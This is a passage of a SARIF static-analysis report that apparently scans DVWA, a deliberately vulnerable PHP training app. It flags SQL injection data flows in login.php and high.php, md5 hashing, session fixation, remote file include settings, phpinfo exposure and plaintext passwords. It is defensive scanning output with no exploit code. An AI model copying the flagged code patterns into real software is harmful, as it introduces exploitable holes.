              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.html"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4559",
      "message" : {
        "text" : "The file Filter.html on line 97 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "79E7F0D6FE8B64B1E7F8D8BFCED45685"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Filter.html"
          },
          "region" : {
            "startLine" : 97,
            "endLine" : 97,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Filter.html:97"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.html"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Filter.html:97"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.html"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4631",
      "message" : {
        "text" : "The file Filter.php.html on line 481 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AD16B9CEF94BB79A9ADD1141A36E64C0"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Filter.php.html"
          },
          "region" : {
            "startLine" : 481,
            "endLine" : 481,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Filter.php.html:481"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.php.html"
                },
                "region" : {
                  "startLine" : 481
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Filter.php.html:481"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.php.html"
                },
                "region" : {
                  "startLine" : 481
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4632",
      "message" : {
        "text" : "The file Filter.php.html on line 481 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AD16B9CEF94BB79A9ADD1141A36E64C1"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Filter.php.html"
          },
          "region" : {
            "startLine" : 481,
            "endLine" : 481,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Filter.php.html:481"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.php.html"
                },
                "region" : {
                  "startLine" : 481
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Filter.php.html:481"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.php.html"
                },
                "region" : {
                  "startLine" : 481
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4490",
      "message" : {
        "text" : "The file Filter_Storage.php.html on line 678 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "57EE9FB4D6A189039F9E0AFA0F9FBD57"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Filter_Storage.php.html"
          },
          "region" : {
            "startLine" : 678,
            "endLine" : 678,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Filter_Storage.php.html:678"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter_Storage.php.html"
                },
                "region" : {
                  "startLine" : 678
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Filter_Storage.php.html:678"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter_Storage.php.html"
                },
                "region" : {
                  "startLine" : 678
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4491",
      "message" : {
        "text" : "The file Filter_Storage.php.html on line 678 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "57EE9FB4D6A189039F9E0AFA0F9FBD58"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Filter_Storage.php.html"
          },
          "region" : {
            "startLine" : 678,
            "endLine" : 678,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Filter_Storage.php.html:678"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter_Storage.php.html"
                },
                "region" : {
                  "startLine" : 678
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Filter_Storage.php.html:678"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter_Storage.php.html"
                },
                "region" : {
                  "startLine" : 678
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4514",
      "message" : {
        "text" : "The file Init.php.html on line 571 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "60C164AE634499261064016A3912CC08"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Init.php.html"
          },
          "region" : {
            "startLine" : 571,
            "endLine" : 571,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Init.php.html:571"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Init.php.html"
                },
                "region" : {
                  "startLine" : 571
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Init.php.html:571"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Init.php.html"
                },
                "region" : {
                  "startLine" : 571
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4515",
      "message" : {
        "text" : "The file Init.php.html on line 571 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "60C164AE634499261064016A3912CC09"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Init.php.html"
          },
          "region" : {
            "startLine" : 571,
            "endLine" : 571,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Init.php.html:571"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Init.php.html"
                },
                "region" : {
                  "startLine" : 571
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Init.php.html:571"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Init.php.html"
                },
                "region" : {
                  "startLine" : 571
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4658",
      "message" : {
        "text" : "The file Monitor.php.html on line 1240 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C359D5621F4DB1AAFECFDCB4A14B1BF9"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Monitor.php.html"
          },
          "region" : {
            "startLine" : 1240,
            "endLine" : 1240,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Monitor.php.html:1240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Monitor.php.html"
                },
                "region" : {
                  "startLine" : 1240
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php.html:1240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Monitor.php.html"
                },
                "region" : {
                  "startLine" : 1240
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4659",
      "message" : {
        "text" : "The file Monitor.php.html on line 1240 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C359D5621F4DB1AAFECFDCB4A14B1BFA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Monitor.php.html"
          },
          "region" : {
            "startLine" : 1240,
            "endLine" : 1240,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Monitor.php.html:1240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Monitor.php.html"
                },
                "region" : {
                  "startLine" : 1240
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php.html:1240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Monitor.php.html"
                },
                "region" : {
                  "startLine" : 1240
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4568",
      "message" : {
        "text" : "The file Report.php.html on line 769 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "81B50245A76D7D524032CC514C2E5D0A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Report.php.html"
          },
          "region" : {
            "startLine" : 769,
            "endLine" : 769,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Report.php.html:769"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Report.php.html"
                },
                "region" : {
                  "startLine" : 769
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Report.php.html:769"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Report.php.html"
                },
                "region" : {
                  "startLine" : 769
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4569",
      "message" : {
        "text" : "The file Report.php.html on line 769 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "81B50245A76D7D524032CC514C2E5D0B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Report.php.html"
          },
          "region" : {
            "startLine" : 769,
            "endLine" : 769,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Report.php.html:769"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Report.php.html"
                },
                "region" : {
                  "startLine" : 769
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Report.php.html:769"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Report.php.html"
                },
                "region" : {
                  "startLine" : 769
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4496",
      "message" : {
        "text" : "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5AEFE1B90CC69A0F0036310ADAE8883A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/container-min.js"
          },
          "region" : {
            "startLine" : 1,
            "endLine" : 1,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "container-min.js:1 - CommentFile"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/container-min.js"
                },
                "region" : {
                  "startLine" : 1
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "container-min.js:1 - CommentFile"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/container-min.js"
                },
                "region" : {
                  "startLine" : 1
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4642",
      "message" : {
        "text" : "The file index.html on line 348 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B6611C5DE5B15B1D3A33512C11DF6661"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/index.html"
          },
          "region" : {
            "startLine" : 348,
            "endLine" : 348,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "index.html:348"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/index.html"
                },
                "region" : {
                  "startLine" : 348
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.html:348"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/index.html"
                },
                "region" : {
                  "startLine" : 348
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4643",
      "message" : {
        "text" : "The file index.html on line 348 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B6611C5DE5B15B1D3A33512C11DF6662"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/index.html"
          },
          "region" : {
            "startLine" : 348,
            "endLine" : 348,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "index.html:348"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/index.html"
                },
                "region" : {
                  "startLine" : 348
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.html:348"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/index.html"
                },
                "region" : {
                  "startLine" : 348
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4640",
      "message" : {
        "text" : "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B4C211F829B9E8F82E65CD662C5B3523"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/yahoo-dom-event.js"
          },
          "region" : {
            "startLine" : 1,
            "endLine" : 1,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "yahoo-dom-event.js:1 - CommentFile"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/yahoo-dom-event.js"
                },
                "region" : {
                  "startLine" : 1
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "yahoo-dom-event.js:1 - CommentFile"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/yahoo-dom-event.js"
                },
                "region" : {
                  "startLine" : 1
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4403",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1A0C1BCB04833B21F1E93780B9FB7F02"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "login.php"
          },
          "region" : {
            "startLine" : 27,
            "endLine" : 27,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "login.php:27 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:27 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4396",
      "message" : {
        "text" : "On line 33 of login.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "16947C885431CB88EF8A2A624935F820"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "login.php"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "login.php:33 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:33 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4602",
      "message" : {
        "text" : "Line 40 of login.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "96E5B38B6882141BD86B1FB8C12A4C1A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "login.php"
          },
          "region" : {
            "startLine" : 40,
            "endLine" : 40,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "login.php:20 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:40 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:20 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:20 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:21 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:21 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:22 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:22 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:39 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "login.php:40 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "login.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4709",
      "message" : {
        "text" : "Authenticating a user without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions. \n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E297AEC4E0B79C75D421DE8053E1A186"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "php.ini"
          },
          "region" : {
            "startLine" : 1,
            "endLine" : 1,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "php.ini:1"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "php.ini"
                },
                "region" : {
                  "startLine" : 1
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "php.ini:1"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "php.ini"
                },
                "region" : {
                  "startLine" : 1
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4762",
      "message" : {
        "text" : "Operating on remote files can allow an attacker to inject malicious content into the program.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "FE935BB692F5FF2A7BFBE8064F7EE1B2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "php.ini"
          },
          "region" : {
            "startLine" : 4,
            "endLine" : 4,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "php.ini:4 - allow_url_fopen"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "php.ini"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "php.ini:4 - allow_url_fopen"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "php.ini"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4364",
      "message" : {
        "text" : "Include statements that refer to remote files can allow an attacker to inject malicious content into the program.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "017C84D60260B644B13656B36B02353C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "php.ini"
          },
          "region" : {
            "startLine" : 5,
            "endLine" : 5,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "php.ini:5 - allow_url_include"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "php.ini"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "php.ini:5 - allow_url_include"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "php.ini"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4675",
      "message" : {
        "text" : "The program might reveal system data or debugging information in phpinfo.php with a call to phpinfo() on line 8. The information revealed by phpinfo() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C814080A4DC5D70B3FF32F428B7D4F5C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "phpinfo.php"
          },
          "region" : {
            "startLine" : 8,
            "endLine" : 8,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "phpinfo.php:8 - phpinfo()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "phpinfo.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "phpinfo.php:8 - phpinfo()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "phpinfo.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4580",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8B81E8D8FAB7C7740633A97B5F93BD25"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/high.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:12 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:12 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4560",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7A511DBD8504209D24010638124F38BE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/high.php"
          },
          "region" : {
            "startLine" : 16,
            "endLine" : 16,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:16 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:16 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4397",
      "message" : {
        "text" : "Line 20 of high.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "17F62E7DC7DE4902CCE25ADDD57AF2CF"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/high.php"
          },
          "region" : {
            "startLine" : 20,
            "endLine" : 20,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
